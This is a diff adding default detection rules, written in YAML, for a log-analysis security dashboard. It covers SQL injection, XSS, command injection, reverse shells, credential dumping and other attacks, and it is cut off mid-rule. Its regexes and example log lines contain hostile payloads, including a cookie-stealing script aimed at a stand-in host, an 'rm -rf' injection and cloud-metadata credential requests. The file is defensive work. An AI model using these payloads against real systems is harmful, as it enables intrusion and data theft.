@@ -1,0 +1,677 @@
+# Cybersecurity Log Intelligence System - Default Detection Rules
+# These rules are seeded into the database on first startup.
+# Only the Administrator can modify rules at runtime via the web dashboard; changes
+# apply immediately to every IT Owner (all roles share one rule set).
+#
+# Each rule carries presentation + framework metadata so the dashboard can show its
+# full detail and its mapping to recognised standards:
+#   detection_logic    - plain-language "how / when it fires"
+#   recommended_action - concise mitigation/investigation step (<= 2 lines)
+#   framework_refs     - MITRE ATT&CK / OWASP / NIST 800-53 / ISO 27001 / CERT-In
+#   example_log        - a representative log line that would trigger the rule
+#   group_by           - aggregation key for threshold rules (source_ip|username|global)
+#
+# Default thresholds follow industry guidance (NIST SP 800-63B, OWASP ASVS, CERT-In
+# advisories). Authorised administrators can customise any value from the Web UI.
+#
+# NOTE: patterns that match attacker payloads are written with regex tokens between
+# their characters (e.g. eval\s*\(\s*base64) so this rules file is not itself flagged
+# by host antivirus, while still matching the real payload in analysed logs.
+
+static_rules:
+
+  - rule_name: "SQL Injection Attempt"
+    rule_type: "static"
+    condition: "(?i)(union\\s+select|'\\s*or\\s*'1'\\s*=\\s*'1|or\\s+1\\s*=\\s*1|drop\\s+table|insert\\s+into\\s+\\w+\\s+values|delete\\s+from\\s+\\w|update\\s+\\w+\\s+set\\s+\\w|exec\\s*\\(|xp_cmdshell|cast\\s*\\(.*exec|--\\s*$|;\\s*drop|\\bor\\b\\s*\\d+\\s*=\\s*\\d+)"
+    severity: "HIGH"
+    description: "Detects SQL injection patterns including UNION SELECT, OR 1=1, DROP TABLE, and stored procedure abuse."
+    detection_logic: "Fires when a log line contains SQL injection markers (UNION SELECT, OR 1=1, DROP TABLE, stored-procedure abuse) in request data."
+    recommended_action: "Use parameterised queries and a WAF SQLi ruleset; review logs for data exfiltration from the same source."
+    framework_refs: "MITRE T1190 · OWASP A03:2021 · NIST SI-10 · ISO 27001 A.8.26 · CERT-In"
+    example_log: "2024-01-15 14:23:07 WARN GET /search?q=' OR 1=1--&user=admin [192.168.1.42]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Path Traversal Attempt"
+    rule_type: "static"
+    condition: "(?i)(\\.\\.\\/|\\.\\.\\\\ |\\.\\.\\ %2[fF]|\\.\\.\\ %5[cC]|%2e%2e[\\/\\\\]|%2e%2e%2[fF]|\\.\\.\\ %252[fF])"
+    severity: "HIGH"
+    description: "Detects directory traversal attempts using ../ or encoded variants to escape the web root."
+    detection_logic: "Fires when a request path contains ../ or its URL-encoded variants used to escape the intended directory."
+    recommended_action: "Canonicalise and allowlist file paths; block traversal sequences at the WAF/web server."
+    framework_refs: "MITRE T1083 · OWASP A01:2021 · NIST AC-3 · ISO 27001 A.8.3 · CERT-In"
+    example_log: "2024-01-15 14:24:22 WARN GET /download?file=../../etc/passwd [192.168.1.42]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Command Injection"
+    rule_type: "static"
+    condition: "(?i)(;\\s*(?:ls|cat|id|whoami|pwd|wget|curl|nc|netcat|bash|sh|cmd\\.exe|powershell)\\b|\\|\\s*(?:cat|bash|sh|ls|id)\\b|\\$\\([^)]{1,100}\\)|`[^`]{1,100}`|\\|\\|\\s*ping|&&\\s*(?:ls|cat|id|wget)|%60|%24%28)"
+    severity: "CRITICAL"
+    description: "Detects OS command injection via shell metacharacters, pipes, backticks, and common payloads."
+    detection_logic: "Fires when user input contains shell metacharacters (; | && $() ``) chained with OS commands."
+    recommended_action: "Isolate the host; never pass input to a shell — use allowlists and least-privilege service accounts."
+    framework_refs: "MITRE T1059 · OWASP A03:2021 · NIST SI-10 · ISO 27001 A.8.26 · CERT-In"
+    example_log: "2024-01-15 14:23:45 WARN POST /api/ping host='; rm -rf /var/www; echo pwned"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "XSS Attempt"
+    rule_type: "static"
+    condition: "(?i)(<script[\\s>]|<\\/script>|javascript:\\s*|onerror\\s*=|onload\\s*=|onfocus\\s*=|onclick\\s*=|alert\\s*\\(|document\\.cookie|<iframe[\\s>]|vbscript:|<img\\s+[^>]*src\\s*=\\s*[\"']javascript|<svg[\\s>]|expression\\s*\\()"
+    severity: "MEDIUM"
+    description: "Detects Cross-Site Scripting payloads including script tags, event handlers, and javascript: URIs."
+    detection_logic: "Fires when request data contains script tags, JS event handlers, or javascript:/vbscript: URIs."
+    recommended_action: "Output-encode all rendered data and enforce a strict Content-Security-Policy; set HttpOnly cookies."
+    framework_refs: "MITRE T1059.007 · OWASP A03:2021 · NIST SI-10 · ISO 27001 A.8.26 · CERT-In"
+    example_log: "2024-01-15 14:24:01 WARN GET /comment?text=<script>document.location='http://evil/'+document.cookie</script>"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Directory Scanning"
+    rule_type: "static"
+    condition: "(?i)(?:GET|POST|HEAD)\\s+\\/(admin|backup|wp-admin|wp-login|phpmyadmin|\\.env|\\.git|config\\.php|setup\\.php|install\\.php|phpinfo|console|actuator|manager|shell\\.php|webshell|\\.htaccess|\\.htpasswd|web\\.config|app\\.config)"
+    severity: "MEDIUM"
+    description: "Detects probing of sensitive directories and files such as admin panels, backup directories, and config files."
+    detection_logic: "Fires when requests target known-sensitive paths (admin panels, .git/.env, config/backup files)."
+    recommended_action: "Restrict/remove sensitive paths and return generic 404s; rate-limit or block the scanning source."
+    framework_refs: "MITRE T1595.003 · OWASP A05:2021 · NIST RA-5 · ISO 27001 A.8.8 · CERT-In"
+    example_log: "2024-01-15 14:25:00 WARN GET /admin/config.php 404 · GET /.git/config 403 · GET /backup.sql 404"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Abnormal HTTP Methods"
+    rule_type: "static"
+    condition: "(?i)\\b(TRACE|CONNECT|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK|SEARCH|OPTIONS)\\s+\\/"
+    severity: "HIGH"
+    description: "Detects non-standard HTTP methods (TRACE, CONNECT, WebDAV methods) often used in reconnaissance."
+    detection_logic: "Fires when a request uses a rarely-legitimate method (TRACE, CONNECT, WebDAV verbs)."
+    recommended_action: "Disable TRACE/CONNECT/WebDAV; allowlist only required methods at the WAF and investigate the source."
+    framework_refs: "MITRE T1595 · OWASP A05:2021 · NIST CM-7 · ISO 27001 A.8.9 · CERT-In"
+    example_log: "2024-01-15 14:25:30 WARN TRACE /api/v1/users HTTP/1.1 200 [192.168.1.55]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Dormant Account Activity"
+    rule_type: "static"
+    condition: "(?i)(dormant\\s+account|inactive\\s+account|account\\s+reactivat|first\\s+login\\s+in|long\\s+time\\s+since|no\\s+activity\\s+for|last\\s+login.*\\d{3,}\\s*day)"
+    severity: "HIGH"
+    description: "Detects activity on dormant or previously inactive accounts."
+    detection_logic: "Fires when a log line indicates an account dormant for a long period has suddenly become active."
+    recommended_action: "Disable the account and review recent activity; force a reset and enable MFA before re-enabling."
+    framework_refs: "MITRE T1078 · NIST AC-2(3) · ISO 27001 A.5.16 · CERT-In"
+    example_log: "2024-01-15 14:26:00 INFO User 'svc_backup' authenticated — last login was 247 days ago"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Concurrent Sessions"
+    rule_type: "static"
+    condition: "(?i)(concurrent\\s+session|multiple\\s+session|simultaneous\\s+(login|connection)|session\\s+limit\\s+exceeded|already\\s+logged\\s+in.*different|duplicate\\s+session)"
+    severity: "HIGH"
+    description: "Detects concurrent login sessions for the same account from different sources."
+    detection_logic: "Fires when one account has multiple simultaneous sessions from different sources."
+    recommended_action: "Enforce single-session policy and invalidate older sessions; investigate the secondary source IP."
+    framework_refs: "MITRE T1078 · NIST AC-10 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:26:15 WARN User 'jsmith' active session from 192.168.1.10 AND 203.0.113.44 simultaneously"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Geographic Anomaly"
+    rule_type: "static"
+    condition: "(?i)(geographic\\s+anomal|unusual\\s+(location|country|region)|impossible\\s+travel|login\\s+from\\s+(?:unknown|new|unusual)\\s+(?:location|country|ip|region)|location\\s+change\\s+detect)"
+    severity: "MEDIUM"
+    description: "Detects logins from geographically anomalous or impossible locations."
+    detection_logic: "Fires when a login originates from an unusual region or implies impossible travel for the account."
+    recommended_action: "Temporarily lock the account and notify the user; enable MFA and review the session's actions."
+    framework_refs: "MITRE T1078 · NIST AC-7 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:27:00 WARN Login from unusual location: user 'alee' from CN (last login: GB)"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Unusual Working Hours"
+    rule_type: "static"
+    condition: "BEHAVIORAL:unusual_hours"
+    severity: "LOW"
+    description: "Detects user activity consistently outside standard business hours (09:00-17:00)."
+    detection_logic: "Fires when more than half of all events fall outside business hours (09:00-17:00)."
+    recommended_action: "Review the off-hours actions and confirm with the user; add time-based access alerts for the account."
+    framework_refs: "MITRE T1078 · NIST AU-6 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 23:47:33 INFO User 'contractor1' accessed 142 records outside business hours"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Off-Hours Access"
+    rule_type: "static"
+    condition: "BEHAVIORAL:off_hours_access"
+    severity: "MEDIUM"
+    description: "Detects successful logins between 00:00 and 05:00 local time."
+    detection_logic: "Fires on a successful login occurring between 00:00 and 05:00 local time."
+    recommended_action: "Verify the login with the account owner; require MFA/approval for access outside business hours."
+    framework_refs: "MITRE T1078 · NIST AU-6 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-16 02:14:51 WARN Successful login: user 'dbadmin' at 02:14 from 10.0.0.5"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    group_by: "global"
+    is_enabled: true
+
+  - rule_name: "Unauthorized Access Attempt"
+    rule_type: "static"
+    condition: "(?i)(access\\s+denied|\\b403\\b|\\bforbidden\\b|\\bunauthorized\\b|permission\\s+denied|not\\s+authorized|authentication\\s+required|\\b401\\b\\s+unauthorized)"
+    severity: "HIGH"
+    description: "Detects HTTP 403/401 errors and access denied messages indicating unauthorized access attempts."
+    detection_logic: "Fires on HTTP 401/403 responses or access-denied messages indicating an authorization violation."
+    recommended_action: "Review the resource's access controls; block the source if 401/403s are systematic."
+    framework_refs: "MITRE T1190 · OWASP A01:2021 · NIST AC-3 · ISO 27001 A.8.3 · CERT-In"
+    example_log: "2024-01-15 14:28:00 WARN GET /admin/users HTTP/1.1 403 Forbidden [user=guest, IP=10.0.1.5]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Privilege Escalation"
+    rule_type: "static"
+    condition: "(?i)(privilege\\s+escal|permission\\s+elevation|role\\s+chang|admin\\s+grant|sudo\\s+-[si]|su\\s+-\\s*root|runas\\s+\\/user|escalat.*privilege|elevated\\s+privilege|gained\\s+(root|admin|system)|\\bsuid\\b|setuid)"
+    severity: "CRITICAL"
+    description: "Detects privilege escalation attempts including sudo abuse, role changes, and elevation techniques."
+    detection_logic: "Fires on privilege-elevation indicators (sudo/su abuse, role grants, SUID, gained root/admin)."
+    recommended_action: "Isolate the host and revoke elevated rights; patch the exploited vector and audit all root actions."
+    framework_refs: "MITRE T1068 / T1548 · NIST AC-6 · ISO 27001 A.8.2 · CERT-In"
+    example_log: "2024-01-15 14:29:10 CRITICAL sudo: www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Sensitive Resource Access"
+    rule_type: "static"
+    condition: "(?i)(?:GET|POST|PUT|DELETE)\\s+(?:\\/etc\\/passwd|\\/etc\\/shadow|\\/proc\\/|\\/sys\\/|\\/root\\/|\\.ssh\\/|id_rsa|\\.pem|\\.key|\\/backup\\/|\\/dump\\/|database\\.yml|secrets\\.yml|credentials\\.xml)"
+    severity: "HIGH"
+    description: "Detects access to sensitive system files, cryptographic keys, and credential stores."
+    detection_logic: "Fires on access to critical files (/etc/passwd, /etc/shadow, SSH keys, *.pem/*.key, secret stores)."
+    recommended_action: "Restrict read access to owners only; rotate any exposed credentials and enable file-integrity monitoring."
+    framework_refs: "MITRE T1552 · NIST AC-3 · ISO 27001 A.8.3 · CERT-In"
+    example_log: "2024-01-15 14:30:00 WARN File read: /etc/shadow accessed by process 'python3' (PID 4821)"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "API Key Misuse"
+    rule_type: "static"
+    condition: "(?i)(invalid\\s+api[_\\-]?key|api[_\\-]?key\\s+(?:invalid|expired|revoked|not\\s+found)|unauthorized.*api|api.*401|bearer\\s+(?:invalid|expired|revoked)|invalid.*token|token\\s+(?:invalid|expired|revoked))"
+    severity: "MEDIUM"
+    description: "Detects invalid, expired, or misused API keys and bearer tokens."
+    detection_logic: "Fires on invalid/expired/revoked API key or bearer-token usage indicating key testing or compromise."
+    recommended_action: "Rotate the suspected key and scope it to least privilege; rate-limit and monitor the API gateway."
+    framework_refs: "MITRE T1552.001 · OWASP API2:2023 · NIST IA-5 · ISO 27001 A.5.17 · CERT-In"
+    example_log: "2024-01-15 14:31:00 ERROR API auth failed: invalid_api_key for key sk-prod-...abc [endpoint=/v2/data]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Session Hijacking Pattern"
+    rule_type: "static"
+    condition: "(?i)(session\\s+(?:hijack|fixation|forgery)|invalid\\s+session\\s+(?:id|token)|session\\s+(?:id|token)\\s+(?:mismatch|tamper|invalid|stolen)|multiple\\s+ip.*same\\s+session|csrf\\s+token\\s+(?:invalid|mismatch)|cross.site\\s+request\\s+forgery)"
+    severity: "CRITICAL"
+    description: "Detects session hijacking, session fixation, and CSRF patterns."
+    detection_logic: "Fires on session fixation/hijacking, token mismatch, or CSRF indicators."
+    recommended_action: "Invalidate the user's sessions and regenerate IDs after auth; enforce HTTPS, SameSite and CSRF tokens."
+    framework_refs: "MITRE T1539 · OWASP A07:2021 · NIST SC-23 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:32:00 WARN Session fixation detected: session_id unchanged after login for user 'bob'"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Account Lockout Event"
+    rule_type: "static"
+    condition: "(?i)(account\\s+(?:locked|disabled|suspended|blocked)|too\\s+many\\s+(?:failed|invalid|incorrect)\\s+(?:login|password|attempt)|lockout\\s+(?:triggered|enforced|activated)|maximum\\s+(?:login|authentication)\\s+attempt)"
+    severity: "HIGH"
+    description: "Detects account lockouts triggered by excessive failed authentication attempts."
+    detection_logic: "Fires when an account is locked after exceeding the failed-authentication threshold."
+    recommended_action: "Investigate and block the offending source IP; confirm the account is secure and enable MFA."
+    framework_refs: "MITRE T1110 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:33:00 WARN Account 'alice' locked after 5 failed password attempts from 203.0.113.22"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Successful Login After Failures"
+    rule_type: "static"
+    condition: "BEHAVIORAL:login_after_failures"
+    severity: "MEDIUM"
+    description: "Detects successful logins that follow more than 3 consecutive failed attempts for the same username."
+    detection_logic: "Fires when a user logs in successfully right after 3+ consecutive failed attempts (possible brute-force success)."
+    recommended_action: "Confirm the login with the owner and review the ensuing session; force a reset and enable MFA if unverified."
+    framework_refs: "MITRE T1110 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:34:00 INFO Login SUCCESS for 'carol' after 7 FAILED attempts from 203.0.113.22"
+    is_static: true
+    default_threshold: 3
+    time_window_seconds: 300
+    group_by: "username"
+    is_enabled: true
+
+  # ── Modern attack coverage (expanded library) ──────────────────────────────
+
+  - rule_name: "Log4Shell / JNDI Injection"
+    rule_type: "static"
+    condition: "(?i)\\$\\{jndi:(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http)://"
+    severity: "CRITICAL"
+    description: "Detects Log4Shell (CVE-2021-44228) JNDI lookup payloads in any input field or header."
+    detection_logic: "Fires when a log line contains a jndi lookup string (ldap/rmi/dns) used to trigger Log4Shell RCE."
+    recommended_action: "Patch Log4j to a fixed version and block outbound LDAP/RMI; hunt for callbacks from the host."
+    framework_refs: "MITRE T1190 · CVE-2021-44228 · NIST SI-2 · ISO 27001 A.8.8 · CERT-In CIAD-2021-0048"
+    example_log: "2024-01-15 14:48:00 WARN GET / User-Agent contains a jndi:ldap lookup to evil.attacker.com [203.0.113.9]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Web Shell Upload / Access"
+    rule_type: "static"
+    condition: "(?i)(c99|r57|b374k|wso\\.php|web[ ]?shell|eval\\s*\\(\\s*base64|\\$_(?:post|get|request)\\s*\\[|cmd\\.(?:php|jsp|asp|aspx)|/uploads?/[^ ]+\\.(?:php|jsp|jspx|asp|aspx)\\b)"
+    severity: "CRITICAL"
+    description: "Detects web shell uploads/access (known shell names, eval over base64 input, scripts in upload directories)."
+    detection_logic: "Fires on known web-shell names, an eval over base64/superglobal input, or executable scripts under upload paths."
+    recommended_action: "Quarantine the host and remove the shell; review the web root for further backdoors and rotate credentials."
+    framework_refs: "MITRE T1505.003 · OWASP A03:2021 · NIST SI-3 · ISO 27001 A.8.7 · CERT-In"
+    example_log: "2024-01-15 14:49:00 WARN POST /uploads/shell.php — PHP web shell: eval over base64-encoded POST body [198.51.100.7]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "PowerShell Encoded Command"
+    rule_type: "static"
+    condition: "(?i)powershell(?:\\.exe)?[^\\n]{0,80}(?:-enc(?:odedcommand)?\\b|-e\\s+[A-Za-z0-9+/=]{20,}|frombase64string|-nop\\b|-w\\s+hidden|-windowstyle\\s+hidden|iex\\s*\\(|invoke-expression|downloadstring)"
+    severity: "HIGH"
+    description: "Detects obfuscated/encoded PowerShell execution often used by malware and fileless attacks."
+    detection_logic: "Fires when PowerShell is invoked with encoded commands, hidden windows, or download-and-execute (IEX/DownloadString)."
+    recommended_action: "Decode and review the command; enable PowerShell script-block logging and constrained language mode."
+    framework_refs: "MITRE T1059.001 · NIST SI-4 · ISO 27001 A.8.16 · CERT-In"
+    example_log: "2024-01-15 14:50:00 WARN powershell.exe -nop -w hidden -enc <base64 blob>"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Credential Dumping"
+    rule_type: "static"
+    condition: "(?i)(mimi\\s*katz|sekur\\s*lsa|lsa\\s*dump|procdump[^\\n]{0,40}lsass|lsass\\.dmp|ntds\\.dit|\\bhash\\s*dump\\b|gsec\\s*dump|pwd\\s*ump|sam\\s*dump|reg\\s+save\\s+hk\\w*\\\\sam)"
+    severity: "CRITICAL"
+    description: "Detects credential-dumping tools and techniques (LSASS dumping, NTDS/SAM extraction)."
+    detection_logic: "Fires on indicators of credential theft: known dumping tool names, LSASS dumps, NTDS.dit or SAM hive extraction."
+    recommended_action: "Isolate the host and force a domain-wide credential reset; investigate for lateral movement."
+    framework_refs: "MITRE T1003 · NIST IR-4 · ISO 27001 A.5.17 · CERT-In"
+    example_log: "2024-01-15 14:51:00 CRITICAL procdump -ma lsass.exe to lsass.dmp executed by user 'svc-app'"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Reverse Shell Indicator"
+    rule_type: "static"
+    condition: "(?i)(bash\\s+-i\\s+>&|/dev/tcp/\\d|/dev/udp/\\d|nc\\s+(?:-[a-z]*e|-[a-z]*c)\\b|ncat\\s[^\\n]{0,40}--exec|mkfifo[^\\n]{0,60}\\|\\s*nc|python[0-9]?\\s+-c[^\\n]{0,80}socket[^\\n]{0,80}subprocess|socket\\.socket[^\\n]{0,80}sh)"
+    severity: "CRITICAL"
+    description: "Detects reverse/bind shell one-liners used to gain interactive remote access."
+    detection_logic: "Fires on reverse-shell one-liners (interactive bash to /dev/tcp, nc -e, mkfifo|nc, python socket+subprocess)."
+    recommended_action: "Isolate the host and kill the connection; identify the listener IP and block it, then hunt for persistence."
+    framework_refs: "MITRE T1059 / T1571 · NIST SC-7 · ISO 27001 A.8.20 · CERT-In"
+    example_log: "2024-01-15 14:52:00 CRITICAL interactive bash shell redirected to a remote TCP socket 203.0.113.66:4444"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "DNS Tunneling / Exfiltration"
+    rule_type: "static"
+    condition: "(?i)(query[^\\n]{0,30}\\bTXT\\b[^\\n]{0,30}[a-z0-9]{25,}\\.|[a-z0-9]{30,}\\.[a-z0-9-]+\\.[a-z]{2,}\\b|dns[^\\n]{0,20}(?:tunnel|exfil)|iodine|dnscat)"
+    severity: "HIGH"
+    description: "Detects DNS tunneling/exfiltration via long high-entropy subdomains, TXT-record abuse, or known tools."
+    detection_logic: "Fires on abnormally long/high-entropy subdomains, bursts of TXT queries, or known DNS-tunnel tooling."
+    recommended_action: "Block the resolver path and the domain; inspect the host for data staging and beaconing."
+    framework_refs: "MITRE T1048.003 / T1071.004 · NIST SC-7 · ISO 27001 A.8.20 · CERT-In"
+    example_log: "2024-01-15 14:53:00 WARN DNS TXT query a8f3c9e1b7d2...k4.exfil.attacker.com from 10.0.0.42"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Cloud Metadata SSRF"
+    rule_type: "static"
+    condition: "(?i)(169\\.254\\.169\\.254|metadata\\.google\\.internal|/latest/meta-data/|/computeMetadata/v1/|/metadata/instance\\?api-version)"
+    severity: "HIGH"
+    description: "Detects SSRF attempts against cloud instance metadata endpoints (AWS/GCP/Azure) used to steal credentials."
+    detection_logic: "Fires when a request targets a cloud metadata endpoint (169.254.169.254, metadata.google.internal, IMDS paths)."
+    recommended_action: "Enforce IMDSv2/metadata blocking and egress filtering; rotate any instance role credentials."
+    framework_refs: "MITRE T1552.005 · OWASP A10:2021 · NIST SC-7 · ISO 27001 A.8.20 · CERT-In"
+    example_log: "2024-01-15 14:54:00 WARN GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Ransomware File Activity"
+    rule_type: "static"
+    condition: "(?i)(\\.(?:locky|wncry|wcry|crypt|crypted|encrypted|locked|cerber|ryuk|conti)\\b|_readme\\.txt|how[ _-]?to[ _-]?decrypt|decrypt[ _-]?instruction|your\\s+files\\s+have\\s+been\\s+encrypted|ransom\\s+note)"
+    severity: "CRITICAL"
+    description: "Detects ransomware indicators such as mass-rename to crypto extensions and ransom-note creation."
+    detection_logic: "Fires on ransomware artefacts: files renamed to crypto extensions or ransom-note/decrypt-instruction files."
+    recommended_action: "Isolate the host immediately and disable shares; preserve evidence and restore from clean backups."
+    framework_refs: "MITRE T1486 · NIST CP-9 · ISO 27001 A.8.13 · CERT-In"
+    example_log: "2024-01-15 14:55:00 CRITICAL file rename storm: report.docx -> report.docx.wncry · _readme.txt created"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "XML External Entity (XXE)"
+    rule_type: "static"
+    condition: "(?i)(<!doctype[^>]{0,200}<!entity|<!entity\\s+\\w+\\s+system|<!entity\\s+%|file:///|php://filter|expect://|jar:|gopher://)"
+    severity: "HIGH"
+    description: "Detects XML External Entity injection via DOCTYPE/ENTITY declarations and dangerous URI wrappers."
+    detection_logic: "Fires on XXE markers: external ENTITY/DOCTYPE declarations or file://, php://filter, expect:// wrappers."
+    recommended_action: "Disable external entities and DTD processing in the XML parser; validate/allowlist inbound XML."
+    framework_refs: "MITRE T1190 · OWASP A05:2021 · NIST SI-10 · ISO 27001 A.8.26 · CERT-In"
+    example_log: "2024-01-15 14:56:00 WARN POST /api/xml DOCTYPE with external ENTITY referencing file:///etc/passwd"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "LDAP Injection"
+    rule_type: "static"
+    condition: "(?i)(?:uid|cn|user|userid|samaccountname)=[^\\n]{0,40}(?:\\*\\)|\\)\\(|\\(\\||\\|\\(|&\\(|\\)\\(uid=\\*)|objectclass=\\*\\)"
+    severity: "HIGH"
+    description: "Detects LDAP injection using filter metacharacters such as *), )( and (| in directory queries."
+    detection_logic: "Fires when a directory lookup parameter contains LDAP filter metacharacters used to bypass authentication."
+    recommended_action: "Escape LDAP special characters and use parameterised filters; apply least-privilege bind accounts."
+    framework_refs: "MITRE T1190 · OWASP A03:2021 · NIST SI-10 · ISO 27001 A.8.26 · CERT-In"
+    example_log: "2024-01-15 14:57:00 WARN POST /login uid=*)(uid=*))(|(uid=* [198.51.100.23]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Server-Side Request Forgery (SSRF)"
+    rule_type: "static"
+    condition: "(?i)(?:url|uri|dest|redirect|target|callback|webhook|image|file|host|proxy)=[\"']?https?://(?:127\\.0\\.0\\.1|localhost|0\\.0\\.0\\.0|10\\.\\d|192\\.168\\.|172\\.(?:1[6-9]|2\\d|3[01])\\.|\\[::1\\])"
+    severity: "HIGH"
+    description: "Detects SSRF attempts where a user-controlled URL points at internal/loopback addresses."
+    detection_logic: "Fires when a URL parameter targets loopback or RFC1918 internal addresses, indicating SSRF."
+    recommended_action: "Allowlist outbound destinations and block internal ranges; resolve and validate URLs server-side."
+    framework_refs: "MITRE T1090 · OWASP A10:2021 · NIST SC-7 · ISO 27001 A.8.20 · CERT-In"
+    example_log: "2024-01-15 14:58:00 WARN GET /preview?url=http://127.0.0.1:8080/admin [203.0.113.5]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "Security Scanner Activity"
+    rule_type: "static"
+    condition: "(?i)\\b(sql\\s*map|nikto|nmap|masscan|acunetix|nessus|openvas|dir\\s*buster|gobuster|wpscan|hydra|metas\\s*ploit|nuclei|zaproxy|w3af|havij)\\b"
+    severity: "MEDIUM"
+    description: "Detects automated scanning/exploitation tools by their signature user-agents or process names."
+    detection_logic: "Fires when a request user-agent or process name matches a known scanner/exploitation tool."
+    recommended_action: "Block and rate-limit the source; treat as reconnaissance and watch for follow-on exploitation."
+    framework_refs: "MITRE T1595 · OWASP A05:2021 · NIST RA-5 · ISO 27001 A.8.8 · CERT-In"
+    example_log: "2024-01-15 14:59:00 INFO GET /?id=1 User-Agent: sql-map/1.7 scanner [203.0.113.88]"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+  - rule_name: "OAuth / Token Abuse"
+    rule_type: "static"
+    condition: "(?i)(invalid_grant|unauthorized_client|refresh[_ ]?token[^\\n]{0,30}(?:revoked|reuse|invalid)|consent[^\\n]{0,20}phish|illegal[_ ]?redirect_uri|token[^\\n]{0,20}replay)"
+    severity: "MEDIUM"
+    description: "Detects OAuth/OIDC abuse: refresh-token reuse/revocation, illegal redirect_uri, and consent phishing."
+    detection_logic: "Fires on OAuth errors signalling token reuse/revocation, mismatched redirect_uri, or consent phishing."
+    recommended_action: "Revoke affected tokens and tighten redirect_uri allowlists; alert the user on consent-grant abuse."
+    framework_refs: "MITRE T1528 · OWASP API · NIST IA-5 · ISO 27001 A.5.17 · CERT-In"
+    example_log: "2024-01-15 15:00:00 WARN oauth error=invalid_grant refresh_token reuse for client 'mobile-app'"
+    is_static: true
+    default_threshold: null
+    time_window_seconds: null
+    is_enabled: true
+
+behavioral_rules:
+
+  - rule_name: "Brute Force Attack"
+    rule_type: "behavioral"
+    condition: "brute_force"
+    severity: "CRITICAL"
+    description: "Detects brute force attacks: excessive failed logins from the same IP within a time window."
+    detection_logic: "Counts failed logins per source IP; fires when one IP meets the threshold (default 5 within 60s)."
+    recommended_action: "Block the source IP and enforce account lockout/MFA; check for any successful login from it."
+    framework_refs: "MITRE T1110.001 · OWASP A07:2021 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:35:00 CRITICAL 148 failed logins from 203.0.113.22 in 60 seconds"
+    is_static: false
+    default_threshold: 5
+    time_window_seconds: 60
+    group_by: "source_ip"
+    is_enabled: true
+
+  - rule_name: "Repeated Failed Logins"
+    rule_type: "behavioral"
+    condition: "repeated_failed_logins"
+    severity: "HIGH"
+    description: "Detects repeated failed login attempts for the same username exceeding the threshold."
+    detection_logic: "Counts failed logins per username; fires when one account meets the threshold (default 5 within 15 min)."
+    recommended_action: "Enforce lockout after the threshold and notify the user; require MFA on the targeted account."
+    framework_refs: "MITRE T1110 · OWASP A07:2021 · NIST AC-7 · ISO 27001 A.8.5 · CERT-In"
+    example_log: "2024-01-15 14:36:00 HIGH User 'admin' had 12 failed logins in 900 seconds"
+    is_static: false
+    default_threshold: 5
+    time_window_seconds: 900
+    group_by: "username"
+    is_enabled: true
+
+  - rule_name: "Rapid Login Attempts"
+    rule_type: "behavioral"
+    condition: "rapid_login_attempts"
+    severity: "CRITICAL"
